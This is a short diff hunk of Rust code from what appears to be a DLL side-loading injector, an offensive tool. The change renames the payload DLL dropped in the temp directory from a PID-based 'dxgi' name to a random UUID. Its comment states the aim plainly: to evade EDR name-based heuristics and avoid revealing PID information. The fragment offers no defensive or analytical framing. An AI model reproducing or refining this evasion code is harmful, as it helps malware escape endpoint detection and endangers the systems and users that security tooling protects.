@@ -35,9 +35,19 @@ impl Injector for DllSideLoadInjector {
         };
 
         // ── 1. Write the payload DLL to a temp path ─────────────────────
-        // Use %TEMP% with a name that resembles a Windows system DLL.
+        // Use %TEMP% with a random UUID-based name.
+        //
+        // The old name (dxgi-{pid}.dll) was predictable (PID is small and
+        // known to EDR) and used a suspicious DX prefix that triggers name-
+        // based heuristics.  A random UUID name is statistically unique per
+        // injection, provides no PID information, and does not match any
+        // known suspicious prefix list.
         let tmp = std::env::temp_dir();
-        let dll_name = format!("{}\\dxgi-{}.dll", tmp.display(), std::process::id());
+        let dll_name = format!(
+            "{}\\{}.dll",
+            tmp.display(),
+            uuid::Uuid::new_v4().simple()
+        );
         let dll_name_c = std::ffi::CString::new(dll_name.as_str())
             .map_err(|_| anyhow!("DLL path has interior NUL"))?;
 
